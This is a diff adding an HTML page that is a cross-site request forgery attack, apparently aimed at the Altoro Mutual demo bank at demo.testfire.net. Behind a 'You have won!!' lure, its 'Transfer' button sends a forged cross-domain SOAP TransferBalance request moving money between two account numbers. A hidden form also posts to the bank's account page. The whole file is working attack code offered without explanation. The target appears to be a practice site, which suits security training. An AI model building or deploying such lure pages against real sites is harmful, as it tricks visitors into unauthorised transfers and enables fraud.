@@ -1,0 +1,59 @@
+<html>
+<head>
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+
+</head>	
+
+<body>
+	You have won!!
+	</body>
+	<br>
+	<button onclick="transfer();">Transfer</button>
+	</br>
+
+	<button onclick="show();">Show</button>
+
+
+	<form id="Form1" method="post" action="http://demo.testfire.net/bank/account.aspx">
+		<input id="listAccounts" value="1001160140" hidden="true">
+    </form>
+
+
+<body>
+
+
+<script type="text/javascript">
+
+	window.show = function() {
+		$("#Form1" ).submit()
+	}
+
+	window.transfer = function() {
+
+		var settings = {
+			  "async": true,
+			  "crossDomain": true,
+			  "url": "http://demo.testfire.net/bank/ws.asmx",
+			  "method": "POST",
+			  "headers": {
+			    "content-type": "text/xml",
+			    "accept": "*/*",
+			    "accept-language": "en-US,en;q=0.8,hi;q=0.6",
+			    "cache-control": "no-cache"
+			  },
+			  "data": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\n xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" \n xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">\n <soap:Body>\n  <TransferBalance xmlns=\"http://www.altoromutual.com/bank/ws/\">\n   <transDetails>\n    <transferDate>2000-01-01</transferDate>\n    <debitAccount>1001160140</debitAccount>\n    <creditAccount>1001160141</creditAccount>\n    <transferAmount>20</transferAmount>\n   </transDetails>\n  </TransferBalance>\n </soap:Body>\n</soap:Envelope>"
+			}
+
+		$.ajax(settings).done(function (response) {
+		  console.log(response);
+		});
+
+	}
+</script>
+		
+<script type="text/javascript">
+		window.setTimeout(function(){
+			
+		},10000);
+</script>
+</html>
